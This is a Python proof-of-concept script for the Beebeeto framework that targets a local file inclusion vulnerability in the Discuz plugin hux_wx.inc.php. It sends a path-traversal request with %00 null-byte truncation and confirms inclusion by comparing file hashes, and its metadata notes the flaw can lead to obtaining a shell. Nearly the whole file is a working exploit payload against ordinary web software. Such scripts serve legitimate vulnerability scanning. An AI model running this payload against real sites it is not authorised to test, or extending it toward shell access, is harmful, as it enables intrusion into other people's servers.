#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import urllib2

from hashlib import md5
from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0009',
            'name': 'Discuz /source/plugin/hux_wx/hux_wx.inc.php 本地文件包含漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-01-15',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['*'],
            'type': 'Local File Inclusion',
            'tag': ['Discuz插件漏洞', '本地文件包含漏洞', '/source/plugin/hux_wx/hux_wx.inc.php', 'php'],
            'desc': '配合 %00 截断可 GetShell',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-079517',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_file = '/plugin.php?id=hux_wx:hux_wx&uid=1&mod=/../../../..&ac=/static/image/admincp/add.gif%00'
        vul_url = args['options']['target'] + verify_file
        verify_url = '%s/static/image/admincp/add.gif' % args['options']['target']

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Request URL: ' + vul_url

        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        req2 = urllib2.Request(vul_url)
        content2 = urllib2.urlopen(req2).read()
        if md5(content).hexdigest() == md5(content2).hexdigest():
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())